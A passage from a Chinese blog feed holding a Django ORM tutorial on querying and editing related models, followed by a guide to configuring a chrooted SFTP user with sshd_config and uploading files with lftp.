class="comment">#返回红球，通过母表查询子表，写法："母表对象.子表表名的小写.子表字段名"；找到颜色为红色的Ball的description</span></span><br><span class="line"><span class="comment">#写法2，反向从子表入手：</span></span><br><span class="line">print(models.Ball.objects.get(color__colors=<span class="string">"红"</span>).description)  <span class="comment">#返回红球，通过母表查询子表，但形式上是从子表对象自身直接获取字段，写法："子表.objects.get(一对一的子表字段__母表字段="xxx").子表字段"；效果和上边完全一致，另一种形式</span></span><br></pre></td></tr></table></figure>

<p><strong>增：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加一种颜色黑，并添加黑球</span></span><br><span class="line">color_obj=models.Colors.objects.create(colors=<span class="string">"黑"</span>)  <span class="comment">#先在母表中创建颜色，并实例化给颜色表对象</span></span><br><span class="line">models.Ball.objects.create(color=color_obj,description=<span class="string">"黑球"</span>)  <span class="comment">#更新Ball表，color字段为颜色表对象，添加description字段</span></span><br></pre></td></tr></table></figure>

<p><em>备注：增添数据的3种常用方式</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#增添数据的三种写法：</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">color_obj=models.Colors.objects.create(colors=<span class="string">"黑"</span>)</span><br><span class="line">models.Ball.objects.create(color=color_obj,description=<span class="string">"黑球"</span>)</span><br><span class="line"><span class="comment">#写法1补充：</span></span><br><span class="line">color_id=models.Colors.objects.create(colors=<span class="string">"黑"</span>).id</span><br><span class="line">models.Ball.objects.create(color_id=color_id,description=<span class="string">"黑球"</span>)</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">color_obj=models.Colors.objects.create(colors=<span class="string">"黑"</span>)</span><br><span class="line">ball_obj=models.Ball(color=color_obj,description=<span class="string">"黑球"</span>)</span><br><span class="line">ball_obj.save()</span><br><span class="line"><span class="comment">#写法3(字典导入)：</span></span><br><span class="line">color_obj=models.Colors.objects.create(colors=<span class="string">"黑"</span>)</span><br><span class="line">ball_dic=&#123;<span class="string">'description'</span>:<span class="string">"黑球"</span>&#125;</span><br><span class="line">models.Ball.objects.create(color=color_obj,**ball_dic)</span><br></pre></td></tr></table></figure>

<p><strong>改：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color_obj=models.Colors.objects.get(colors=<span class="string">"黑"</span>) <span class="comment">#.get()等同于.filter().first()</span></span><br><span class="line">color_obj.colors=<span class="string">"灰"</span></span><br><span class="line">color_obj.save()</span><br><span class="line">models.Ball.objects.filter(description=<span class="string">"黑球"</span>).update(color=color_obj,description=<span class="string">"灰球"</span>) <span class="comment">#update(),delete()是QuerySet的方法</span></span><br></pre></td></tr></table></figure>

<p><em>备注：修改数据的常见方式</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更新一条数据</span></span><br><span class="line">color_obj=models.Colors.objects.get(colors=<span class="string">"黑"</span>)</span><br><span class="line">color_obj.colors=<span class="string">"灰"</span></span><br><span class="line">color_obj.save()</span><br><span class="line"><span class="comment">#更新多条数据，把满足条件的球的description都变为灰球</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">models.Ball.objects.filter(color__colors=<span class="string">"红"</span>).update(description=<span class="string">"灰球"</span>)</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">up_dic=&#123;<span class="string">"description"</span>:<span class="string">"灰球"</span>&#125;</span><br><span class="line">models.Ball.objects.filter(id__gt=<span class="number">0</span>).update(**up_dic)</span><br></pre></td></tr></table></figure>

<p><strong>删：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">models.Ball.objects.get(description=<span class="string">"灰球"</span>).delete() <span class="comment">#对象和QuerySet都有方法delete()</span></span><br><span class="line">models.Colors.objects.filter(colors=<span class="string">"灰"</span>).delete()</span><br><span class="line"></span><br><span class="line">models.Colors.objects.all().delete() <span class="comment">#清空一张表</span></span><br></pre></td></tr></table></figure>

<h3 id="一对多（外键）"><a href="#一对多（外键）" class="headerlink" title="一对多（外键）"></a>一对多（外键）</h3><p><strong>查：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#外键表联合查询：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#外键子表查询母表,与一对一子表查询母表形式一致</span></span><br><span class="line"><span class="comment">#找到红裤衩所属的颜色表中的颜色--返回:红</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">print(models.Clothes.objects.get(description=<span class="string">"小虎哥"</span>).color.colors)  <span class="comment">#返回红，通过子表查询母表，写法："子表对象.母表表名的小写.母表字段名" ；通过Clothes表查到description为"小虎哥"，查找到对应colors</span></span><br><span class="line"><span class="comment">#写法2，反向从母表入手：</span></span><br><span class="line">print(models.Colors.objects.get(clothes__description=<span class="string">"小虎哥"</span>).colors)  <span class="comment">#返回红，通过子表查询母表，但形式上是从母表对象自身直接获取字段，写法："母表.objects.get(子表名小写__子表字段="xxx").母表字段名" ；效果和上边完全一致，另一种形式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#外键母表查询子表,与一对一形式不同，因为母表为"多"，不能像一对一一样通过.get().子表.子表字段的方式获取，但与多对多母表查询子表一致</span></span><br><span class="line"><span class="comment">#找到颜色为红的所有服装--返回:[&lt;Clothes: 大美女&gt;, &lt;Clothes: 小虎哥&gt;]</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">color_obj=models.Colors.objects.get(colors=<span class="string">"红"</span>)</span><br><span class="line">print(color_obj.clothes_set.all())  <span class="comment">#注意：子表小写_set的写法,它实际上是一个QuerySet,可以用update,delete,all,filter等方法</span></span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">print(models.Clothes.objects.filter(color=models.Colors.objects.get(colors=<span class="string">"红"</span>)))</span><br><span class="line"><span class="comment">#写法2简便写法（推荐）：</span></span><br><span class="line">print(models.Clothes.objects.filter(color__colors=<span class="string">"红"</span>))  <span class="comment">#写法：filter(子表外键字段__母表字段='过滤条件')</span></span><br><span class="line"><span class="comment">#写法3：</span></span><br><span class="line">color_id=models.Colors.objects.get(colors=<span class="string">"红"</span>).id  <span class="comment">#通过母表获取到颜色为红的id</span></span><br><span class="line">print(models.Clothes.objects.filter(color_id=color_id))  <span class="comment">#filter得到QuerySet,写法：filter(子表外键字段_母表主键=母表主键对象)</span></span><br></pre></td></tr></table></figure>

<p> <em>备注：通过QuerySet的.values()方法，将QuerySet转化为ValuesQuerySet</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(models.Clothes.objects.filter(color=models.Colors.objects.get(colors=<span class="string">"红"</span>)).values(<span class="string">'color__colors'</span>,<span class="string">'description'</span>))  <span class="comment">#获取子表的description字段，和母表的colors字段，获取母表字段写法: 子表外键字段名__母表字段名--适用于values()或filter()</span></span><br><span class="line"><span class="comment">#简写形式补充：</span></span><br><span class="line">print(models.Clothes.objects.filter(color__colors=<span class="string">"红"</span>).values(<span class="string">'color__colors'</span>,<span class="string">'description'</span>))</span><br><span class="line"><span class="comment">#返回：</span></span><br><span class="line">[&#123;<span class="string">'description'</span>: <span class="string">u'\u7ea2\u5185\u8863'</span>, <span class="string">'color__colors'</span>: <span class="string">u'\u7ea2'</span>&#125;, &#123;<span class="string">'description'</span>: <span class="string">u'\u7ea2\u5185\u88e4'</span>, <span class="string">'color__colors'</span>: <span class="string">u'\u7ea2'</span>&#125;]</span><br><span class="line"><span class="comment">#如果不加values(),返回的是[&lt;Clothes: 大美女&gt;, &lt;Clothes: 小虎哥&gt;]这样一个QuerySet集合，通过values可以形成一个列表，列表中的每一个元素是一个字典，可以通过list()将ValuesQeurySet转化为列表，之后返回给templates</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#另外可通过.values_list()将QuerySet转化为ValuesListQuerySet。返回：[(u'\u7ea2', u'\u7ea2\u889c\u5b50'), (u'\u7ea2', u'\u7ea2\u889c\u5b50')]</span></span><br><span class="line"><span class="comment">#得到的是一个列表，列表中是多个元组，每个元组是ValuesQuerySet中字典的value，常用于从models里将数据取出后动态添加到前端模板中的select选项中。</span></span><br><span class="line"><span class="comment">#通过forms.py从models取值传给前端select选项，需重启django后，select选项才能更新，可在定义form时，添加如下关键字保障动态更新select选项</span></span><br><span class="line"><span class="comment">#forms.py</span></span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> test1 <span class="keyword">import</span> models</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClothesForm</span><span class="params">(forms.Form)</span>:</span></span><br><span class="line">    color=forms.IntegerField(required=<span class="literal">True</span>,widget=forms.Select(),)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,*args,**kwargs)</span>:</span>  <span class="comment">#定义这个关键字段，当使用form时，colors表新增了颜色，前端ClothesForm的color字段的选项会自动更新</span></span><br><span class="line">        super(ClothesForm, self).__init__(*args,**kwargs)</span><br><span class="line">        self.fields[<span class="string">'color'</span>].widget.choices=models.Colors.objects.all().order_by(<span class="string">'id'</span>).values_list(<span class="string">'id'</span>,<span class="string">'colors'</span>)</span><br></pre></td></tr></table></figure>

<p><strong>增：</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#增添子表数据，形式与一对一一致</span></span><br><span class="line"><span class="comment">#添加颜色为绿的服装：小帅哥</span></span><br><span class="line"><span class="comment">#方法1：</span></span><br><span class="line">models.Clothes.objects.create(color=models.Colors.objects.get(colors=<span class="string">"绿"</span>),description=<span class="string">"小帅哥"</span>)</span><br><span class="line"><span class="comment">#方法1补充：</span></span><br><span class="line">models.Clothes.objects.create(color_id=models.Colors.objects.get(colors=<span class="string">"绿"</span>).id,description=<span class="string">"小帅哥"</span>)</span><br><span class="line"><span class="comment">#方法2：</span></span><br><span class="line">c_obj=models.Clothes(color=models.Colors.objects.get(colors=<span class="string">"绿"</span>),description=<span class="string">"小帅哥"</span>)</span><br><span class="line">c_obj.save()</span><br><span class="line"><span class="comment">#方法3：字典方式录入..参考一对一</span></span><br></pre></td></tr></table></figure>

<p><strong>改：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#颜色为红的服装，description都更新为大美女</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">models.Clothes.objects.filter(color__colors=<span class="string">"红"</span>).update(description=<span class="string">"大美女"</span>)</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">models.Clothes.objects.filter(color_id=models.Colors.objects.get(colors=<span class="string">"红"</span>).id).update(description=<span class="string">"大美女"</span>)</span><br><span class="line"><span class="comment">#写法3：</span></span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"红"</span>)</span><br><span class="line">colors_obj.clothes_set.filter(id__gte=<span class="number">1</span>).update(description=<span class="string">"大美女"</span>)</span><br><span class="line"><span class="comment">#其他写法参照一对一的修改和外键的查询</span></span><br></pre></td></tr></table></figure>

<p><strong>删：</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">models.Clothes.objects.get(description=<span class="string">"灰裙子"</span>).delete() <span class="comment">#对象和QuerySet都有方法delete()</span></span><br><span class="line">models.Colors.objects.filter(colors=<span class="string">"灰"</span>).delete()</span><br></pre></td></tr></table></figure>

<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><p><strong>查：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多对多子表查询母表,查找小明喜欢哪些颜色--返回:[&lt;Colors: 红&gt;, &lt;Colors: 黄&gt;, &lt;Colors: 蓝&gt;]</span></span><br><span class="line"><span class="comment">#与一对多子表查询母表的形式不同，因为一对多，查询的是母表的“一”；多对多，查询的是母表的“多”</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小明"</span>)  <span class="comment">#写法：子表对象.子表多对多字段.过滤条件(all()/filter())</span></span><br><span class="line">print(child_obj.favor.all())</span><br><span class="line"><span class="comment">#写法2，反向从母表入手：</span></span><br><span class="line">print(models.Colors.objects.filter(child__name=<span class="string">"小明"</span>)) <span class="comment">#母表对象.filter(子表表名小写__子表字段名="过滤条件")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多对多母表查询子表,查找有哪些人喜欢黄色--返回:[&lt;Child: 小明&gt;, &lt;Child: 丫蛋&gt;]</span></span><br><span class="line"><span class="comment">#与一对多母表查询子表的形式完全一致，因为查到的都是QuerySet，一对多和多对多，都是在查询子表的“多”</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">color_obj=models.Colors.objects.get(colors=<span class="string">"黄"</span>)</span><br><span class="line">print(color_obj.child_set.all())</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">print(models.Child.objects.filter(favor=models.Colors.objects.get(colors=<span class="string">"黄"</span>)))</span><br><span class="line"><span class="comment">#写法2简便写法(推荐):</span></span><br><span class="line">print(models.Child.objects.filter(favor__colors=<span class="string">"黄"</span>))  <span class="comment">#写法：filter(子表外键字段__母表字段='过滤条件')</span></span><br><span class="line"><span class="comment">#写法3：</span></span><br><span class="line">color_id=models.Colors.objects.get(colors=<span class="string">"黄"</span>).id  <span class="comment">#通过母表获取到颜色为红的id</span></span><br><span class="line">print(models.Child.objects.filter(favor=color_id))  <span class="comment">#filter得到QuerySet,写法：filter(子表外键字段=母表主键对象),此处和一对多略有不同，是子表外键字段而不是外键字段_母表主键</span></span><br></pre></td></tr></table></figure>

<p><strong>增与改（增添子表或母表数据参照一对一的增，多对多重点在于关系表的对应关系变更）：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加子表关联关系</span></span><br><span class="line"><span class="comment">#添加小虎并让他喜欢所有颜色</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">child_obj=models.Child.objects.create(name=<span class="string">"小虎"</span>)  <span class="comment">#如果是已有用户，使用.get()</span></span><br><span class="line">colors_obj=models.Colors.objects.all()  <span class="comment">#创建颜色表的所有颜色QuerySet对象</span></span><br><span class="line">child_obj.favor.add(*colors_obj)  <span class="comment">#添加对应关系,将小虎和所有颜色进行关联，写法：子表对象.子表多对多字段.add(*QuerySet对象)</span></span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.all()</span><br><span class="line">child_obj.favor=colors_obj</span><br><span class="line">child_obj.save()</span><br><span class="line"><span class="comment">#让小虎喜欢黄色和蓝色(2种写法和上边一致，只展示一种写法)</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.filter(colors__in=[<span class="string">"蓝"</span>,<span class="string">"黄"</span>])  <span class="comment">#models默认只能用这种方式得到并集，如需更复杂的过滤逻辑，需使用模块Q</span></span><br><span class="line">child_obj.favor.clear()  <span class="comment">#清空小虎已经喜欢的颜色</span></span><br><span class="line">child_obj.favor.add(*colors_obj)  <span class="comment">#add是追加模式，如果当前小虎已经喜欢绿色，那么执行后，小虎会额外喜欢蓝，黄</span></span><br><span class="line"><span class="comment">#让小虎喜欢绿色(2种写法和上边一致，只展示一种写法)</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"绿"</span>)</span><br><span class="line">child_obj.favor.clear()</span><br><span class="line">child_obj.favor.add(colors_obj)  <span class="comment">#此处没有*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加母表关联关系</span></span><br><span class="line"><span class="comment">#让喜欢蓝色的人里添加小虎,可以用上边的方法，一个效果，让小虎喜欢蓝色，下边介绍反向插入(从母表入手)的写法</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"蓝"</span>)</span><br><span class="line">colors_obj.child_set.add(child_obj)  <span class="comment">#从colors表插入小虎，写法：母表对象.子表名小写_set.add(子表对象)。 让喜欢蓝色的child_set集合添加name="小虎"</span></span><br><span class="line"><span class="comment">#让所有人都喜欢蓝色</span></span><br><span class="line">children_obj=models.Child.objects.all()</span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"蓝"</span>)</span><br><span class="line">colors_obj.child_set.add(*children_obj)</span><br><span class="line"><span class="comment">#关于_set写法，是否已经有些晕了，究竟什么时候使用_set,简单记忆，只有子表才有"子表名小写_set"的写法，得到的是一个QuerySet集合，后边可以接.add(),.remove(),.update(),.delete(),.clear()</span></span><br><span class="line"><span class="comment">#另外备注一下，colors_obj.child_set.clear()是让所有人喜欢的颜色里去掉蓝色，colors_obj.child_set.all().delete()是删除.child_set的所有人</span></span><br></pre></td></tr></table></figure>

<p> <strong>删：</strong></p>
<p>删除多对多表关系 ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除子表与母表关联关系</span></span><br><span class="line"><span class="comment">#让小虎不喜欢任何颜色</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.all()</span><br><span class="line">child_obj.favor=<span class="string">''</span></span><br><span class="line">child_obj.save()</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">colors_obj=models.Colors.objects.all()</span><br><span class="line">child_obj.favor.remove(*colors_obj)</span><br><span class="line"><span class="comment">#写法3：</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">child_obj.favor.clear()</span><br><span class="line"><span class="comment">#其他例子参照多对多的增与改案例，这里不做举例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除母表与子表关联关系</span></span><br><span class="line"><span class="comment">#让所有人不再喜欢蓝色</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">children_obj=models.Child.objects.all()</span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"蓝"</span>)</span><br><span class="line">colors_obj.child_set.remove(*children_obj)</span><br><span class="line"><span class="comment">#写法2：</span></span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"蓝"</span>)</span><br><span class="line">colors_obj.child_set.clear()</span><br></pre></td></tr></table></figure>

<p>删除多对多表数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除子表数据</span></span><br><span class="line"><span class="comment">#喜欢蓝色的所有人都删掉</span></span><br><span class="line">colors_obj=models.Colors.objects.get(colors=<span class="string">"蓝"</span>)</span><br><span class="line">colors_obj.child_set.all().delete()  <span class="comment">#注意有.all()</span></span><br><span class="line"><span class="comment">#删除所有child</span></span><br><span class="line">models.Child.objects.all().delete()</span><br></pre></td></tr></table></figure>

<p>删除母表数据:</p>
<p>默认情况下，如此例中，删除“红”色，那么子表与颜色表是一对一或外键关系的，子表对应数据会自动删除，如：红球，小虎哥<br>与颜色表是多对多关系的话，不会自动删除喜欢红色的人，而是去掉红色已选<br>如果想让与母表外键关联的子表在删除外键之后依旧可以保留子表数据，需要子表建表时加入以下字段：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clothes</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    color=models.ForeignKey(<span class="string">"Colors"</span>,null=<span class="literal">True</span>,on_delete=models.SET_NULL))  <span class="comment">#可为空，如果外键被删后，子表数据此字段置空而不是直接删除这条数据，同理也可以SET_DEFAULT,需要此字段有默认值</span></span><br><span class="line">    description=models.CharField(max_length=<span class="number">10</span>)  <span class="comment">#描述</span></span><br></pre></td></tr></table></figure>

<h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#choices相当于实现一个简化版的外键，外键的选项不能动态更新，如可选项目较少，可以采用</span></span><br><span class="line"><span class="comment">#先在models添加choices字段</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    sex_choice=((<span class="number">0</span>,<span class="string">"男"</span>),(<span class="number">1</span>,<span class="string">"女"</span>))</span><br><span class="line">    name=models.CharField(max_length=<span class="number">10</span>)  <span class="comment">#姓名</span></span><br><span class="line">    favor=models.ManyToManyField(<span class="string">'Colors'</span>)    <span class="comment">#与颜色表为多对多</span></span><br><span class="line">    sex=models.IntegerField(choices=sex_choice,default=<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__unicode__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment">#在views.py中调用</span></span><br><span class="line">child_obj=models.Child.objects.get(name=<span class="string">"小虎"</span>)</span><br><span class="line">print(child_obj.sex)  <span class="comment">#返回0或1</span></span><br><span class="line">print(child_obj.get_sex_display())  <span class="comment">#返回男或女</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>sftp和ftp文件传输服务</title>
    <url>/articles/81de25e2.html</url>
    <content><![CDATA[<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>我们平时习惯了使用ftp来上传下载文件，尤其是很多Linux环境下，我们一般都会通过第三方的SSH工具连接到Linux，但是当我们需要传输文件到Linux服务器当中，很多人习惯用ftp来传输，其实Linux默认是不提供ftp的，需要你额外安装FTP服务器。而且ftp服务器端会占用一定的VPS服务器资源。其实更建议使用sftp代替ftp。理由如下：</p>
<ol>
<li>可以不用额外安装任何服务器端程序</li>
<li>会更省系统资源。</li>
<li>SFTP使用加密传输认证信息和传输数据，相对来说会更安全。</li>
<li>也不需要单独配置，对新手来说比较简单(开启SSH默认就开启了SFTP)。</li>
</ol>
<a id="more"></a>

<h2 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h2><p>FTP是一种文件传输协议，一般是为了方便数据共享的。包括一个FTP服务器和多个FTP客户端。FTP客户端通过FTP协议在服务器上下载资源。而SFTP协议是在FTP的基础上对数据进行加密，使得传输的数据相对来说更安全。但是这种安全是以牺牲效率为代价的，也就是说SFTP的传输效率比FTP要低(不过现实使用当中，没有发现多大差别)。</p>
<p>摘抄来自百度百科</p>
<p>sftp是Secure File Transfer Protocol的缩写，安全<a href="https://baike.baidu.com/item/文件传送协议" target="_blank" rel="noopener">文件传送协议</a>。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。SFTP 为 <a href="https://baike.baidu.com/item/SSH/10407" target="_blank" rel="noopener">SSH</a>的其中一部分，是一种传输档案至 Blogger 伺服器的安全方式。其实在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的<a href="https://baike.baidu.com/item/守护进程" target="_blank" rel="noopener">守护进程</a>，它必须使用sshd守护进程（<a href="https://baike.baidu.com/item/端口" target="_blank" rel="noopener">端口</a>号默认是22）来完成相应的连接和答复操作，所以从某种意义上来说，SFTP并不像一个<a href="https://baike.baidu.com/item/服务器" target="_blank" rel="noopener">服务器</a>程序，而更像是一个客户端程序。SFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密/<a href="https://baike.baidu.com/item/解密技术" target="_blank" rel="noopener">解密技术</a>，所以<a href="https://baike.baidu.com/item/传输效率" target="_blank" rel="noopener">传输效率</a>比普通的<a href="https://baike.baidu.com/item/FTP/13839" target="_blank" rel="noopener">FTP</a>要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。</p>
<h2 id="创建通信账号"><a href="#创建通信账号" class="headerlink" title="创建通信账号"></a>创建通信账号</h2><h3 id="添加sftp组"><a href="#添加sftp组" class="headerlink" title="添加sftp组"></a>添加sftp组</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupadd sftp</span><br></pre></td></tr></table></figure>

<h3 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h3><p>创建一个sftp用户，用户名为mysftp，密码为mysftp</p>
<p>修改用户密码和修改<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">Linux</a>用户密码是一样的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -g sftp -s /bin/false mysftp  #用户名</span><br><span class="line">passwd mysftp  #密码</span><br></pre></td></tr></table></figure>

<h3 id="创建登陆默认访问路径"><a href="#创建登陆默认访问路径" class="headerlink" title="创建登陆默认访问路径"></a>创建登陆默认访问路径</h3><p>sftp组的用户的home目录统一指定到/data/sftp下，按用户名区分，这里先新建一个mysftp目录，然后指定mysftp的home为/data/sftp/mysftp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/sftp/mysftp  </span><br><span class="line">usermod -d /data/sftp/mysftp mysftp</span><br></pre></td></tr></table></figure>

<h3 id="修改sftp配置"><a href="#修改sftp配置" class="headerlink" title="修改sftp配置"></a>修改sftp配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">#找到如下这行，用#符号注释掉，大致在文件末尾处。</span><br><span class="line"># Subsystem      sftp    /usr/libexec/openssh/sftp-server </span><br><span class="line"></span><br><span class="line">#在文件最后面添加如下几行内容，然后保存。</span><br><span class="line">Subsystem       sftp    internal-sftp    </span><br><span class="line">Match Group sftp    </span><br><span class="line">ChrootDirectory /data/sftp/%u    </span><br><span class="line">ForceCommand    internal-sftp    </span><br><span class="line">AllowTcpForwarding no    </span><br><span class="line">X11Forwarding no</span><br></pre></td></tr></table></figure>

<h3 id="设定Chroot目录权限"><a href="#设定Chroot目录权限" class="headerlink" title="设定Chroot目录权限"></a>设定Chroot目录权限</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown root:sftp /data/sftp/mysftp  </span><br><span class="line">chmod 755 /data/sftp/mysftp</span><br></pre></td></tr></table></figure>

<h3 id="建立SFTP用户登入后可写入的目录"><a href="#建立SFTP用户登入后可写入的目录" class="headerlink" title="建立SFTP用户登入后可写入的目录"></a>建立SFTP用户登入后可写入的目录</h3><p>照上面设置后，在重启sshd服务后，用户mysftp已经可以登录。但使用chroot指定根目录后，根应该是无法写入的，所以要新建一个目录供mysftp上传文件。这个目录所有者为mysftp，所有组为sftp，所有者有写入权限，而所有组无写入权限。命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /data/sftp/mysftp/upload  </span><br><span class="line">chown mysftp:sftp /data/sftp/mysftp/upload  </span><br><span class="line">chmod 755 /data/sftp/mysftp/upload</span><br></pre></td></tr></table></figure>

<p>用ChrootDirectory将用户的根目录指定到/data/BJIP-JAVA/histmp/ ，这样用户就只能在/data/BJIP-JAVA/histmp/下活动。</p>
<p>创建登陆默认访问路径<br> mkdir -p /appdata/BJIP-JAVA/histmp/<br> usermod -d /appdata/BJIP-JAVA/histmp/ liuxing<br>1<br>2<br>配置目录权限<br>chmod -R 755 /appdata/BJIP-JAVA/histmp/<br>chown liuxing:sftp /appdata/BJIP-JAVA/histmp/<br>1<br>2<br>修改sftp配置<br>用ChrootDirectory将用户的根目录指定到/appdata/BJIP-JAVA/histmp/ ，这样用户就只能在/appdata/BJIP-JAVA/histmp/下活动。</p>
<h3 id="重启sshd服务"><a href="#重启sshd服务" class="headerlink" title="重启sshd服务"></a>重启sshd服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>

<h2 id="其他服务器上传文件"><a href="#其他服务器上传文件" class="headerlink" title="其他服务器上传文件"></a>其他服务器上传文件</h2><p>登陆服务器192.168.1.199建立文件夹/usr/sunxu，并上传至192.168.1.200默认路径(-d为debug模式)<br>/data/sftp/mysftp/upload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">用法：lftp 用户名:密码@ftp地址:传送端口（默认21）</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">此处命令在服务器192.168.1.199执行</span></span><br><span class="line"></span><br><span class="line">mkdir /usr/sunxu</span><br><span class="line">lftp "sftp://用户名:密码@192.168.1.200" -e "PUT /usr/sunxu" -d</span><br></pre></td></tr></table></figure>

<p>查看192.168.1.200是否有sunxu文件夹</p>
